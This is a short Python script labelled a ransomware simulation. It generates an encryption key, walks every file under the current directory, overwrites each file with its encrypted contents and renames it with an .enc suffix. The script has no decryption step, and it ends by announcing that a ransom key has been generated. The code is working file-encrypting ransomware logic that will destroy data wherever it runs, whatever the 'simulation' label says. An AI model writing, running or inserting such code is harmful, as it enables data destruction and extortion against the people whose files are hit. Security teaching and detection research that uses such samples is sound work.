import os
from cryptography.fernet import Fernet

def generate_key():
    """Generate and save a key for encryption"""
    key = Fernet.generate_key()
    with open("ransomware.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_file(file, key):
    """Encrypt a file"""
    with open(file, "rb") as f:
        file_data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(file_data)
    with open(file, "wb") as f:
        f.write(encrypted)

def run_ransomware():
    print("Ransomware Simulation: Encrypting files...")
    try:
        key = generate_key()
        for root, dirs, files in os.walk("."):
            for file in files:
                if file != "ransomware.key" and not file.endswith(".enc"):
                    full_path = os.path.join(root, file)
                    encrypt_file(full_path, key)
                    os.rename(full_path, full_path + ".enc")
        print("Files have been encrypted! A ransom key has been generated.")
    except Exception as e:
        print(f"An error occurred: {e}")

